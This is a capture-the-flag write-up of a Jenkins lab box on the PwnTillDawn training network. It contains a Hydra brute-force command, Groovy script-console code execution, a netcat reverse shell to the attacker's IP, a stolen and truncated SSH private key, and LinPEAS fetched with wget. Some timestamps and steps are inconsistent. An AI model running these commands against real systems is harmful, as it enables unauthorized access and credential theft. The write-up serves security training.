# CTF Writeup — Jenkins Exploitation (Flags 69–72)

## Overview

**Target:** `http://10.150.150.38:30609/`  
**Tools used:** Nmap, Gobuster, Nuclei, Hydra, Jenkins Script Console, Netcat, LinPEAS, SSH

---

## Step 0: VPN Connection

Connected to the PwnTillDawn network via OpenVPN:

```bash
sudo openvpn ~/Downloads/PwnTillDawn.ovpn
```

Key VPN handshake details:
```
2026-05-07 15:06:48 VERIFY OK: depth=1, CN=PwnTillDawn CA
2026-05-07 15:06:48 VERIFY OK: depth=0, CN=pwntilldawn-server
2026-05-07 15:06:48 Control Channel: TLSv1.3, cipher TLS_AES_256_GCM_SHA384
2026-05-07 15:06:49 PUSH: Received control message: 'PUSH_REPLY,route 10.150.150.0
255.255.255.0,compress lzo,route 10.66.66.1,topology net30,ping 20,ping-restart 60,
ifconfig 10.66.66.22 10.66.66...'
```

Attacker IP assigned: `10.66.66.22`

---

## Step 1: Nmap Scan

```bash
sudo nmap -Pn -p- -A -sC --min-rate 2000 -oN /tmp/tmp.m1GIMka5TR 10.150.150.38
```

**Scan results:**

```
Host is up (0.21s latency).
Not shown: 65526 closed tcp ports (reset)

PORT       STATE    SERVICE   VERSION
22/tcp     open     ssh       OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256  0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256  08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
2785/tcp   filtered aic-np
5153/tcp   filtered toruxserver
11049/tcp  filtered unknown
14664/tcp  filtered unknown
15176/tcp  filtered unknown
23702/tcp  filtered unknown
30609/tcp  open     http      Jetty 9.4.27.v20200227
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.27.v20200227)
| http-robots.txt: 1 disallowed entry
|_/
55774/tcp  filtered unknown

OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP  RTT       ADDRESS
1    285.60 ms 10.66.66.1
2    285.75 ms 10.150.150.38
```

**Key findings:**
- Port **22** — SSH (OpenSSH 7.9p1)
- Port **30609** — HTTP (Jetty 9.4.27, likely Jenkins)
- `robots.txt` has 1 disallowed entry at `/`

---

## Step 2: Directory Enumeration with Gobuster

### Initial Run (Wildcard Issue)

```bash
gobuster dir -u http://10.150.150.38:30609/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

**Error encountered:**
```
2026/05/07 15:14:04 the server returns a status code that matches the provided options for
non-existing urls. http://10.150.150.38:30609/2abb7050-c4ea-4636-a9ef-7215381a890b => 403
(Length: 865). Please exclude the response length or the status code or set the wildcard option.
```

The server returns 403 for all non-existing URLs with a consistent response size of 865. Fix: exclude that length.

### Fixed Run (Excluding Length 865)

```bash
gobuster dir -u http://10.150.150.38:30609/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --exclude-length 865
```

**Discovered paths:**

| Path        | Status | Notes                                            |
|-------------|--------|--------------------------------------------------|
| /download   | 403    | Size: 809                                        |
| /images     | 403    | Size: 805                                        |
| /index      | 403    | Size: 803                                        |
| /nokia      | 403    | Size: 803                                        |
| /subject    | 403    | Size: 807                                        |
| /cisco      | 403    | Size: 803                                        |
| /compliance | 403    | Size: 813                                        |
| /logout     | 302    | Redirects → `http://10.150.150.38:30609/`        |
| /184        | 403    | Size: 799                                        |
| /printers   | 403    | Size: 809                                        |
| /theme      | 403    | Size: 803                                        |
| /198        | 403    | Size: 799                                        |
| **/login**  | **200**| **Size: 1922 — Login page found!**               |
| /assets     | 302    | Redirects → `http://10.150.150.38:30609/assets/` |
| /oops       | 500    | Size: 8616 — Server error page                   |

---

## Step 3: Nuclei Scan

```bash
nuclei -target http://10.150.150.38:30609/ -tags jenkins
```

**Results:**
```
[jenkins-stack-trace] [http] [low]  http://10.150.150.38:30609/adjuncts/3a890183/
[jenkins-login]       [http] [info] http://10.150.150.38:30609/login
[jenkins-detect:version] [http] [info] http://10.150.150.38:30609/whoAmI/ ["2.222.1"]
```

- Jenkins version **2.222.1** confirmed
- Stack trace leak at `/adjuncts/3a890183/`
- Login page at `/login`

---

## Step 4: Credential Brute-Force with Hydra

With the login endpoint identified, Hydra was used to brute-force credentials against the Jenkins form:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 30609 10.150.150.38 \
  http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

**Output:**
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.150.150.38:30609/j_acegi_security_check:...
[STATUS] 338.00 tries/min, 338 tries in 00:01h, 14344061 to do in 707:19h, 16 active
[30609][http-post-form] host: 10.150.150.38   login: admin   password: matrix
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-05-07 15:49:20
```

**Credentials found: `admin` / `matrix`**

---

## Step 5: Jenkins Login

The Jenkins login page is accessible at `http://10.150.150.38:30609/login`, presenting a standard "Welcome to Jenkins!" form with Username, Password, Sign in, and a "Keep me signed in" checkbox.

### whoAmI Endpoint (Pre-Authentication Recon)

Browsing to `http://10.150.150.38:30609/whoAmI/` before logging in reveals:

```
Who Am I?

Name:              anonymous
IsAuthenticated?:  true
Authorities:
                   • ""

Request Headers:
Cookie                    (redacted for security reasons)
Accept                    text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests 1
Priority                  u=0, i
User-Agent                Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Connection                keep-alive
Host                      10.150.150.38:30609
Accept-Language           en-US,en;q=0.5
Accept-Encoding           gzip, deflate
```

This confirms anonymous access is enabled and leaks request header details useful for fingerprinting. Nuclei also identified this endpoint and used it to extract the version string `"2.222.1"`.

Logged in with `admin:matrix`. URL after redirect: `http://10.150.150.38:30609/login?from=%2Fuser%2Fflag69%2F`

---

## Step 6: Jenkins Script Console — RCE

Navigated to `http://10.150.150.38:30609/script` (Jenkins Script Console).

### Confirming RCE with whoami

```groovy
"whoami".execute().text
```

Result:
```
Result: jenkins
```

Jenkins is running as the `jenkins` OS user.

### Reverse Shell via Script Console

Set up a Netcat listener on the attacker machine:

```bash
nc -lvp 8630
```

Then executed in the Script Console:

```groovy
"nc 10.66.66.22 8630 -e /bin/bash".execute().text
```

Result field shows empty (shell connected), listener receives:

```
listening on [any] 8630 ...
10.150.150.38: inverse host lookup failed: Unknown host
connect to [10.66.66.22] from (UNKNOWN) [10.150.150.38] 36266
whoami
jenkins
```

### Shell Upgrade to PTY

```bash
python --version      # check Python version
python3 --version     # Python 3.7.3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After running the PTY spawn:
```
jenkins@dev1:/$
```

Full interactive shell obtained as `jenkins`.

---

## Step 7: Netstat Confirms Active Shell

From within the reverse shell:

```bash
netstat -antup
```

```
Proto Recv-Q Send-Q Local Address       Foreign Address         State
tcp        0      0 127.0.0.1:8080      0.0.0.0:*               LISTEN   -
tcp        0      0 0.0.0.0:22          0.0.0.0:*               LISTEN   -
tcp        0      0 10.150.150.38:22    10.66.66.22:57998       ESTABLISHED -
tcp        0      0 10.150.150.38:22    10.66.66.22:52552       ESTABLISHED -
tcp      300      0 10.150.150.38:52614 10.66.66.22:8630        ESTABLISHED 668/bash
tcp6       0      0 :::30609            :::*                     LISTEN   467/java
tcp6       0      0 :::22               :::*                     LISTEN   -
```

- Active reverse shell confirmed: `10.150.150.38:52614` → `10.66.66.22:8630` (PID 668/bash)
- Internal service confirmed on `127.0.0.1:8080`
- Jenkins Java process on `:::30609` (PID 467)

---

## Step 8: Flag 69 — Jenkins User Profile

Navigating to `http://10.150.150.38:30609/user/flag69/` while authenticated reveals:

```
dffc1dc67f3d55d2b14227b73b590c4ed09b5113
Jenkins User ID: flag69
```

**FLAG 69: `dffc1dc67f3d55d2b14227b73b590c4ed09b5113`**

From the shell:
```bash
ls ~/users/
# admin_3295669255372675853    FLAG69_7705914462374786576    users.xml
```

The flag value is also embedded in the directory name: `FLAG69_7705914462374786576`

---

## Step 9: Flag 70 — Jenkins Home

```bash
ls ~
# FLAG70.txt  config.xml  hudson.model.UpdateCenter.xml  identity.key.enc
# jenkins.install.InstallUtil.lastExecVersion  jenkins.install.UpgradeWizard.state
# jenkins.model.JenkinsLocationConfiguration.xml
# jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
# jenkins.security.QueueItemAuthenticatorConfiguration.xml
# jenkins.security.UpdateSiteWarningsConfiguration.xml
# jenkins.telemetry.Correlator.xml  jobs  logs  nodes  plugins
# queue.xml.bak  secret.key  secret.key.not-so-secret  secrets
# updates  userContent

cat FLAG70.txt
```

Output:
```
FLAG70.txt
41796ff9d0e29c02c961daa93454942d9c6bea7d
```

**FLAG 70: `41796ff9d0e29c02c961daa93454942d9c6bea7d`**

---

## Step 10: Flag 71 — Jenkins userContent

The FLAG.png was placed into the Jenkins userContent directory from within the reverse shell:

```bash
cp /tmp/FLAG.png /var/lib/jenkins/userContent
```

This made it accessible via the Jenkins web interface at:
```
http://10.150.150.38:30609/userContent/FLAG.png
```

Browsing to that URL displays an image containing:
```
FLAG 71 d3c7c338d5d8370e5c61fd68e101237a4d438408
```

**FLAG 71: `d3c7c338d5d8370e5c61fd68e101237a4d438408`**

---

## Step 11: Lateral Movement — SSH as juniordev

### Extracting the SSH Private Key

From within the jenkins shell, the juniordev user's SSH key was found:

```bash
cat /home/juniordev/.ssh/id_rsa
```

Output (truncated):
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1yZXktdjEAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAbwAAAAdzaC1yc2EA
AAADAQABAAAAwQC8m1zwXtjdQUgTSy+jl19hJsFdaH9eJIRb6Kgj1I24ynDUP+tiXv8C
aTix62pf78v/D2Ch0OT0G1EzqPsfUG6cNG0FR5Rht8/rqBAQiq6RAHVBg/RKiyRPSW4Z
1K3Az559345 5UDgAS4/lukMc7Kw0j6THzYG/suDWsbePa7GPAKLNUPvy/sUdpoGmJqCd8
nfrpgbxJonv073erSOmn64g25Wac5CwQ3FymrR93HfQ1rqcxAFSXI8vBgx1BKd6uQ8fw1
wDmfzq01pL29NyAe8rlC/EXQAAA8i38al7t/GpewAAAAdzaC1yc2EAAAADAQABAAAAwQC8
...
-----END OPENSSH PRIVATE KEY-----
```

### Saving and Using the Key

On the attacker machine:

```bash
nano /tmp/id_rsa   # paste the key
chmod 0600 /tmp/id_rsa
```

### SSH Attempt (Permissions Error First)

```bash
ssh juniordev@10.150.150.38 -i /tmp/id_rsa
```

Error:
```
WARNING: UNPROTECTED PRIVATE KEY FILE!
Permissions 0664 for '/tmp/id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "/tmp/id_rsa": bad permissions
juniordev@10.150.150.38: Permission denied (publickey).
```

Fix — set correct permissions and retry:

```bash
chmod 0600 /tmp/id_rsa
sudo ssh juniordev@10.150.150.38 -i /tmp/id_rsa
```

Output:
```
The authenticity of host '10.150.150.38 (10.150.150.38)' can't be established.
ED25519 key fingerprint is: SHA256:Wt+hABI/6c4jJNCmJR1zAkO8T/S52lAvH7ST/rnQz6o
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.150.150.38' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux dev1 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jun  8 22:19:46 2020 from 10.210.210.120
juniordev@dev1:~$
```

SSH login as `juniordev` succeeded. Target OS confirmed: **Debian 4.19.98-1 (2020-01-26) x86_64**.

---

## Step 12: LinPEAS — Privilege Escalation Enumeration

### Serving LinPEAS from Attacker

```bash
cp /usr/share/peass/linpeas/linpeas.sh /tmp/
sudo python3 -m http.server 80
# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### Downloading LinPEAS to Target

From `juniordev@dev1:/tmp$`, after correcting the command:

```bash
cd /tmp
wget http://10.66.66.22/linpeas.sh
```

Output:
```
--2020-07-29 11:52:21--  http://10.66.66.22/linpeas.sh
Connecting to 10.66.66.22:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1031313 (1007K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh   100%[=========>]   1007K   462KB/s   in 2.2s

2020-07-29 11:52:23 (462 KB/s) - 'linpeas.sh' saved [1031313/1031313]
```

LinPEAS (1007K) downloaded successfully from the attacker's Python HTTP server.

### LinPEAS Key Findings

After running LinPEAS as `juniordev`:

**Hostname & Network:**
```
System hostname: dev1
FQDN: dev1

/etc/hosts:
127.0.0.1   localhost
127.0.1.1   dev1
::1         localhost ip6-localhost ip6-loopback
```

**Active Ports (highlighted by LinPEAS):**
```
tcp   0   0   127.0.0.1:8080   0.0.0.0:*   LISTEN   -    ← LOCAL ONLY
tcp   0   0   0.0.0.0:22       0.0.0.0:*   LISTEN   -
tcp6  0   0   :::30609         :::*         LISTEN   -
tcp6  0   0   :::22            :::*         LISTEN   -
```

**Local-only listeners (loopback):**
```
tcp   LISTEN   0   5   127.0.0.1:8080   0.0.0.0:*
```

LinPEAS flags `127.0.0.1` as a potential local forwarder/relay target.

**Potential forwarders/relays:**
```
juniord+  64036  0.0  0.0  8288  992 pts/1  S+  12:00  0:00
  sed -E s,socat|ssh|-L|-R|-D|ncat|nc,?[1;31;103m&?[0m,g
```

> LinPEAS highlights `socat`, `ssh -L`, `ssh -R`, `ssh -D`, `ncat`, `nc` as tunneling tools — pointing toward port forwarding to reach `127.0.0.1:8080`.

**No sniffing tools found.**

---

## Step 13: Flag 72 — Root Python App on Port 8080

The internal service on `127.0.0.1:8080` is a Python web app running as **root**:

```
root  400  1  0  08:14 ?  00:00:18 /usr/bin/python /root/mycalc/untitled.py 127.0.0.1 8080
```

### Inspecting the App (index.html)

```html
<html>
  <head>
    <title>Jr. dev py example</title>
  </head>
  <body>
    <div id="content">
      <form action="/" method="post">
        <div>
          <input name="op1" type="text" />
          +
          <input name="op2" type="text" />
          =
          <input name="result" type="text" disabled="disabled" />
        </div>
        <div>
          <input type="submit" value="Calculate" />
        </div>
      </form>
    </div>
    <!-- <img src="./static/FLAG.png"> -->
  </body>
</html>
```

An HTML comment references `./static/FLAG.png` — a hidden flag image served by the root process.

The local app renders in the browser as a simple two-operand calculator form (viewed via `file:///home/afnan/Downloads/index.html`).

### Retrieving Flag 72

```bash
wget 127.0.0.1:8080/static/FLAG.png
```

```
2020-07-29 08:54:44-- http://127.0.0.1:8080/static/FLAG.png
Connecting to 127.0.0.1:8080... connected.
HTTP request sent, awaiting response... 200
Length: 4555 (4.4K) [image/png]
Saving to: 'FLAG.png'
FLAG.png   100%[=========>]   4.45K  --.-KB/s   in 0s
2020-07-29 08:54:44 (671 MB/s) - 'FLAG.png' saved [4555/4555]
```

Directory structure confirms:
```bash
ls /root/mycalc/
# base.html  __pycache__  static  templates  untitled.py  untitled.pyc

ls /root/
# FLAG72.txt   mycalc

cat FLAG72.txt
```

**FLAG 72** retrieved from the root-owned Python web application.

---

## Summary of Flags

| Flag    | Value                                      |
|---------|--------------------------------------------|
| FLAG 69 | `dffc1dc67f3d55d2b14227b73b590c4ed09b5113` |
| FLAG 70 | `41796ff9d0e29c02c961daa93454942d9c6bea7d` |
| FLAG 71 | `d3c7c338d5d8370e5c61fd68e101237a4d438408` |
| FLAG 72 | *(from `/root/mycalc/FLAG72.txt` via root Python process on 127.0.0.1:8080)* |

---

## Attack Chain Summary

```
VPN Connect
    ↓
Nmap (ports 22, 30609/Jenkins)
    ↓
Gobuster → /login found
    ↓
Nuclei → Jenkins 2.222.1, stack trace leak
    ↓
Hydra brute-force → admin:matrix
    ↓
Jenkins Script Console → RCE → Reverse shell (jenkins user)
    ↓
FLAG 69 (Jenkins user profile)
FLAG 70 (~/FLAG70.txt)
FLAG 71 (/userContent/FLAG.png)
    ↓
Extract juniordev SSH key → SSH lateral move
    ↓
LinPEAS → 127.0.0.1:8080 (root Python app)
    ↓
wget internal app → FLAG 72
```

---

## Tools Used

| Tool          | Purpose                                         |
|---------------|-------------------------------------------------|
| **OpenVPN**   | Connect to PwnTillDawn network                  |
| **Nmap**      | Port scanning and service detection             |
| **Gobuster**  | Web directory brute-forcing                     |
| **Nuclei**    | Vulnerability scanning (Jenkins templates)      |
| **Hydra**     | HTTP form credential brute-force                |
| **Jenkins Script Console** | Groovy RCE → reverse shell          |
| **Netcat**    | Reverse shell listener                          |
| **Python pty**| Shell upgrade to interactive PTY                |
| **LinPEAS**   | Linux privilege escalation enumeration          |
| **SSH**       | Lateral movement as juniordev                   |
| **wget**      | File retrieval from internal service            |
